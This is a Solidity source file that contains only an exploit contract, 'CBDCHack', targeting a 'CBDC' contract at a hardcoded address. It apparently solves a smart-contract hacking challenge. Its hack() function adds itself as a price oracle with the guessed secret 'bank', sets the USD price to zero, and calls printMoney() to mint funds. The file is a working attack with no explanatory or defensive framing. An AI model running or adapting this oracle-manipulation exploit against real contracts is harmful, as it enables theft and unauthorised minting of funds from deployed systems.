//SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface CBDC {
    function addOracle(string calldata _secret) external;
    function updatePrice(bytes32 _blockHash, uint256 _usdPrice) external;
    function printMoney() external;
}

contract CBDCHack {
    CBDC public cbdc = CBDC(0x094251c982cb00B1b1E1707D61553E304289D4D8);

    function hack() public {
        bytes32 _blockHash = blockhash(block.number - 1);
        uint _usdPrice = 0;

        cbdc.addOracle("bank");
        cbdc.updatePrice(_blockHash, _usdPrice);
        cbdc.printMoney();
    }
}